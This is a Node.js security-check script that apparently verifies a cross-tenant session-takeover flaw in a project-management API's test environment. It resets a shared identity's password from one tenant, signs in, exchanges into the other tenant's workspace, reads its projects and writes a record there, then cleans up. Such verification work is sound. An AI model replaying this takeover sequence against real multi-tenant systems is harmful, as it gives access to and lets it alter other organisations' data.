'use strict';
/**
 * L39 independent check, second half (scratch). The original script's
 * "GET /projects 200" was an empty list (a QS with no assignment sees no
 * project). Here 025 seats the shared identity as a PM (company-wide project
 * access), so the question "is 025's own data really read and changed from
 * the seized session" has a real answer. Throwaway identity only.
 */
const { as, raw } = require('../../lib/api');

const PASSWORD = process.env.CERT_PASSWORD; // never printed
const SEIZED = 'Seized0nce3';
const stamp = Date.now();
const email = `l39.chkpm.${stamp}@c024.octapm-cert.test`;
const brief = (res) => `${res.status} ${res.body?.error ? `${res.body.error.code}: ${res.body.error.message}` : JSON.stringify(res.body?.data).slice(0, 200)}`;

(async () => {
  const pm24 = as('pm@c024.octapm-cert.test');
  const pm25 = as('pm@c025.octapm-cert.test');
  const org24 = (await pm24.GET('/auth/me')).active.orgId;
  const org25 = (await pm25.GET('/auth/me')).active.orgId;

  const u = await pm24.POST('/users', { name: 'L39 Check PM', email, password: PASSWORD, role: 'site_engineer' });
  console.log('[setup] 025 seats the identity as pm ->', brief(await pm25.send('POST', '/users', { name: 'ignored', email, role: 'pm' })));
  const list25 = await pm25.GET('/projects');
  const projects25 = list25.items || list25;
  const own24 = await pm24.GET('/projects');
  const ids24 = new Set((own24.items || own24).map((p) => p.id));
  console.log('[setup] 025 PM sees', projects25.length, 'projects; any of them also visible to the 024 PM:', projects25.some((p) => ids24.has(p.id)));

  // L172 corroboration: the team route knows only the home workspace
  console.log('[aside L172] 025 POST /projects/:id/team for its own member ->', brief(await pm25.send('POST', `/projects/${projects25[0].id}/team`, { userId: u.id })));

  console.log('\n[attack] 024 reset-password ->', brief(await pm24.send('POST', `/users/${u.id}/reset-password`, { newPassword: SEIZED })));
  const seized = await raw('POST', '/auth/login', { json: { email, password: SEIZED } });
  const sd = seized.body?.data || {};
  const ex = await raw('POST', `/auth/workspaces/${org25}/session`, { token: sd.identityToken });
  const token = ex.body?.data?.tokens?.accessToken || null;
  console.log('[attack] sign-in', seized.status, '-> exchange into 025', ex.status, 'orgId is 025:', ex.body?.data?.user?.orgId === org25, 'role', ex.body?.data?.user?.role);

  let readOk = false; let wroteOk = false;
  if (token) {
    const pr = await raw('GET', '/projects', { token });
    const items = pr.body?.data?.items || pr.body?.data || [];
    const all25 = items.length > 0 && items.every((p) => projects25.some((q) => q.id === p.id));
    console.log('[attack] GET /projects in 025 ->', pr.status, 'count', items.length, '| every one is a 025 project:', all25, '|', items.slice(0, 2).map((p) => p.name));
    const P = `/projects/${projects25[0].id}`;
    const boq = await raw('GET', `${P}/boq`, { token });
    const rows = boq.body?.data?.items || boq.body?.data?.rows || boq.body?.data || [];
    console.log('[attack] GET <025 project>/boq ->', boq.status, Array.isArray(rows) ? `rows ${rows.length}` : `keys ${Object.keys(rows).slice(0, 6)}`);
    readOk = pr.status === 200 && all25 && boq.status === 200;

    const risk = await raw('POST', `${P}/risks`, { token, json: { description: `L39 check ${stamp}: written from the seized session; removed straight after`, probability: 'low', impact: 'low' } });
    console.log('[attack] POST <025 project>/risks ->', brief(risk));
    if (risk.status === 201 && risk.body?.data?.id) {
      const seen = await pm25.send('GET', `${P}/risks/${risk.body.data.id}`);
      wroteOk = seen.status === 200;
      console.log('[attack] the 025 PM sees that record ->', seen.status);
      console.log('[tidy] delete it ->', (await pm25.send('DELETE', `${P}/risks/${risk.body.data.id}`)).status);
    }
  }
  console.log('[tidy] 025 deactivates the throwaway ->', (await pm25.send('PATCH', `/users/${u.id}/deactivate`)).status);
  console.log('[tidy] 024 deactivates the throwaway ->', (await pm24.send('PATCH', `/users/${u.id}/deactivate`)).status);

  console.log('\nRESULT: 025 project data read from the seized session:', readOk, '| 025 data written from it:', wroteOk);
  process.exitCode = readOk ? 2 : 0;
})().catch((e) => { console.error('ERROR', e.stack || e.message); process.exitCode = 1; });
